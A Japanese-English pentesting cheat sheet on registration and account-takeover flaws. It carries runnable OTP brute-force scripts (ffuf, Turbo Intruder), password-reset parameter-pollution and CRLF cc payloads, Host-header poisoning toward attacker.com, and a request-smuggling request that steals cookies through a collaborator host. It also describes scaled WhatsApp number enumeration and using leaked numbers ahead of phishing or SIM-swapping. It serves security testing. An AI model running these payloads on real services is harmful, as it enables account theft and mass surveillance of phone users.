# 登録と乗っ取りの脆弱性

{{#include ../banners/hacktricks-training.md}}

## 登録の乗っ取り

### 重複登録

- 既存のユーザー名を使って登録を試みる
- メールを変えて確認:
- 大文字/小文字
- +1@
- メールにドットを追加
- メール名に特殊文字を入れる（%00, %09, %20）
- メールの後に空白を入れる: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- メールプロバイダの正規化トリックを試す（サービス依存）:
- Gmail はドットとサブアドレッシングを無視する: `victim+1@gmail.com`, `v.ic.tim@gmail.com` は `victim@gmail.com` に配信される
- ローカルパートを大文字小文字を区別しないプロバイダがある
- 一部プロバイダは unicode の confusables を受け入れる。ホモグリフや soft hyphen `\u00AD` をローカルパート内で試す
- これらを悪用して：一意性チェックを回避、重複アカウント/ workspace 招待を取得、または乗っ取り準備中に被害者のサインアップをブロック（一時的な DoS）

### ユーザー名列挙

アプリ内でユーザー名が既に登録されているかどうかを判別できるか確認する。

- 異なるエラーメッセージや HTTP ステータスコード
- タイミングの違い（既存ユーザは IdP/DB へのルックアップをトリガーする可能性）
- 既知メールのために登録フォームがプロファイルデータを自動入力する
- team/invite フローを確認：メール入力でアカウントの有無が明らかになる場合がある

### パスワードポリシー

ユーザ作成時にパスワードポリシーを確認する（弱いパスワードが使えるか確認）。  
その場合、credentials に対して bruteforce を試みることができる。

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers

{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities

{{#ref}}
saml-attacks/
{{#endref}}

### メールアドレス変更

登録後にメールアドレス変更を試し、その変更が正しく検証されるか、任意のメールに変更できてしまうか確認する。

### その他のチェック

- **使い捨てメール**（mailinator, yopmail, 1secmail 等）が使えるか、または `victim+mailinator@gmail.com` のようなサブアドレッシングでブロックリストを回避できるか確認する
- **長いパスワード** (>200) は **DoS** を引き起こす可能性がある
- **アカウント作成のレート制限**を確認する
- username@**burp_collab**.net を使い、**callback** を解析する
- 電話番号検証が使われている場合、電話番号の解析/注入のエッジケースを確認する

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

電話番号中心のメッセンジャは、クライアントが連絡先を同期するたびに **presence oracle** を公開することがある。WhatsApp の discovery リクエストをリプレイすると歴史的に **>100M lookups per hour** を叩き出し、ほぼ完全なアカウント列挙を可能にしていた。

**攻撃ワークフロー**

1. 公式クライアントをインストルメントしてアドレス帳アップロードリクエストをキャプチャする（正規化された E.164 番号の認証済み blob）。同じ cookies/device token を再利用しつつ、攻撃者生成の番号でリプレイする。
2. リクエストごとに番号をバッチ化する：WhatsApp は数千の識別子を受け入れ、registered/unregistered に加えてメタデータ（business, companion, 等）を返す。レスポンスをオフラインで解析して、被害者にメッセージを送らずにターゲットリストを構築する。
3. SIM バンク、cloud devices、または residential proxies を使って列挙を水平スケールさせ、アカウント/IP/ASN ごとのスロットリングが発動しないようにする。

**ダイヤルプランのモデリング**

各国のダイヤルプランをモデル化して無効な候補を除外する。NDSS データセット（`country-table.*`）は国コード、普及密度、プラットフォーム分布を列挙しているので、ヒット率の高いレンジを優先できる。例となるシーディングコード:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritise prefixes that match real allocations (Mobile Country Code + National Destination Code) before querying the oracle to keep throughput useful.

**Turning enumerations into targeted attacks**

- Feed leaked phone numbers (e.g., Facebook’s 2021 breach) into the oracle to learn which identities are still active before phishing, SIM-swapping, or spamming.
- Slice censuses by country/OS/app type to find regions with weak SMS filtering or heavy WhatsApp Business adoption for localized social engineering.

**Public-key reuse correlation**

WhatsApp exposes each account’s X25519 identity key during session setup. Request identity material for every enumerated number and deduplicate the public keys to reveal account farms, cloned clients, or insecure firmware—shared keys deanonymize multi-SIM operations.

## Weak Email/Phone Verification (OTP/Magic Link)

Registration flows often verify ownership via a numeric OTP or a magic-link token. Typical flaws:

- Guessable or short OTP (4–6 digits) with no effective rate limiting or IP/device tracking. Try parallel guesses and header/IP rotation.
- OTP reuse across actions or accounts, or not bound to the specific user/action (e.g., same code works for login and signup, or works after email is changed).
- Multi-value smuggling: some backends accept multiple codes and verify if any matches. Try:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguish wrong vs expired vs wrong-user codes by status/message/body length.
- Tokens not invalidated after success or after password/email change.
- Verification token not tied to user agent/IP allowing cross-origin completion from attacker-controlled pages.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
逐次的なロックアウトを回避するための並列/同時推測（BurpのTurbo Intruderを使用）:

<details>
<summary>6桁のOTP試行を大量送信するTurbo Intruderスニペット</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- 検証のレースを試す: 同じ有効な OTP を 2 つのセッションで同時に送信する；時に一方のセッションが攻撃者の検証済みアカウントになり、被害者側のフローも成功することがある。
- また、verification リンク上で Host header poisoning をテストして、攻撃者が制御するホストへの leak やそこでの検証完了が発生するか確認する。

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (被害者がサインアップする前)

攻撃者が被害者のメール上で被害者がアカウントを作成する前に操作を行い、後でアクセスを取り戻すような強力な問題群が存在する。

Key techniques to test (ターゲットのフローに合わせて適用):

- Classic–Federated Merge
  - 攻撃者: 被害者のメールで classic アカウントを登録し、パスワードを設定する
  - 被害者: 後で SSO（同じメール）でサインアップする
  - 不適切なマージにより両者がログイン状態のままになったり、攻撃者のアクセスが復活することがある
- Unexpired Session Identifier
  - 攻撃者: アカウントを作成し、長期間有効なセッションを維持する（ログアウトしない）
  - 被害者: アカウントをリカバー／パスワードを設定して使用する
  - リセットや MFA 有効化後に古いセッションが有効なままかどうかをテストする
- Trojan Identifier
  - 攻撃者: 事前作成したアカウントに二次識別子を追加する（電話、追加のメール、あるいは攻撃者の IdP をリンク）
  - 被害者: パスワードをリセットする；攻撃者は後で trojan identifier を使ってリセット／ログインする
- Unexpired Email Change
  - 攻撃者: email-change を攻撃者のメールアドレスに開始し、確認を保留する
  - 被害者: アカウントを回復して使用し始める
  - 攻撃者: 後で保留中の email-change を完了してアカウントを盗む
- Non‑Verifying IdP
  - 攻撃者: メール所有権を検証しない IdP を使って `victim@…` を主張する
  - 被害者: classic 経路でサインアップする
  - サービスが `email_verified` をチェックせずにメールでマージする、またはローカル検証を行わない

実践的なヒント

- web/mobile バンドルからフローとエンドポイントを収集する。classic signup、SSO linking、email/phone change、password reset のエンドポイントを探す。
- 他のフローを試している間にセッションを維持するための現実的な自動化を作る。
- SSO テストでは、テスト用の OIDC provider を立てて、被害者アドレスの `email` クレームと `email_verified=false` を持つトークンを発行し、RP が未検証の IdP を信頼するか確認する。
- いかなる password reset や email change の後も、以下を確認する:
- 他のすべてのセッションとトークンが無効化されていること、
- 保留中の email/phone 変更機能がキャンセルされていること、
- 以前にリンクされていた IdPs／emails／phones が再検証されていること。

Note: これらの手法の詳細な方法論とケーススタディは Microsoft の pre‑hijacking research によって文書化されている（参照は末尾の References を参照）。

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. 自分のメールアドレスに対して password reset をリクエストする
2. password reset リンクをクリックする
3. パスワードは変更しない
4. 任意の 3rd party websites（例: Facebook, twitter）をクリックする
5. Burp Suite proxy でリクエストをインターセプトする
6. referer header が password reset token を leak していないか確認する。

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Burp Suite で password reset リクエストをインターセプトする
2. Burp Suite で以下のヘッダを追加または編集する: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. 修正したヘッダでリクエストを転送する\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host header_ に基づいた password reset URL が `https://attacker.com/reset-password.php?token=TOKEN` のように生成されていないか確認する

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. 攻撃者は自分のアカウントでログインし、**Change password** 機能に移動する必要がある。
2. Burp Suite を起動してリクエストをインターセプトする
3. repeaterタブに送信し、パラメータを編集：User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

password reset token はランダムに生成され、毎回ユニークであるべきです。\
token が期限切れになるか常に同じかを確認してください。場合によっては生成アルゴリズムが弱く、推測可能なことがあります。以下の変数がアルゴリズムで使われる可能性があります。

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. 特定のメール（例: test@mail.com）に対してAPI/UIを使ってpassword reset requestをトリガーする
2. サーバーのレスポンスを確認し、`resetToken` を探す
3. その後、トークンを以下のようなURLで使用する: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. 被害者のusernameと同一だが、username の前後に空白を挿入した username でシステムに登録する。例: `"admin "`
2. 自分の悪意のある username で password reset をリクエストする。
3. 自分のメールに送られたトークンを使って被害者のパスワードをリセットする。
4. 新しいパスワードで被害者のアカウントにログインする。

CTFd プラットフォームはこの攻撃に脆弱でした。\
参照: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. アプリケーション内、または cookies が親ドメインにスコープされているサブドメイン内で XSS を見つける: `*.domain.com`
2. 現在の **sessions cookie** をLeakする
3. その cookie を使ってユーザーとして認証する

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. **smuggler** を使用して HTTP Request Smuggling のタイプ (CL, TE, CL.TE) を検出する\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. 次に `POST / HTTP/1.1` を以下のデータで上書きするリクエストを作成する:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` 目的は被害者を burpcollab へ open redirect で誘導し、cookies を盗むこと
3. 最終的なリクエストは以下のようになるかもしれない
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone はこのバグを悪用した報告をしています\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### CSRF を利用したアカウント乗っ取り <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF 用のペイロードを作成する。例: “HTML form with auto submit for a password change”
2. ペイロードを送信する

### JWT を利用したアカウント乗っ取り <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token がユーザ認証に使われている可能性がある。

- JWT を別の User ID / Email に編集する
- 弱い JWT 署名をチェックする


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

一部のサインアップハンドラは、提供された email が既に存在する場合に upsert を行うことがある。エンドポイントが email と password を含む最小限の body を受け入れ、所有権の検証を強制しない場合、被害者の email を送信することで認証前にその password を上書きできる。

- 発見: bundled JS（または mobile app トラフィック）から endpoint 名を収集し、その後 ffuf/dirsearch を使って /parents/application/v4/admin/FUZZ のような base paths を fuzz する。
- 方法のヒント: GET が "Only POST request is allowed." のようなメッセージを返す場合、正しい動詞が POST であり JSON body が期待されていることを示すことが多い。
- 実際に観測された最小限の body:
```json
{"email":"victim@example.com","password":"New@12345"}
```
PoCの例:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
影響: リセットトークン、OTP、またはメール確認なしでの完全なアカウント乗っ取り (ATO)。

## 参考資料

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
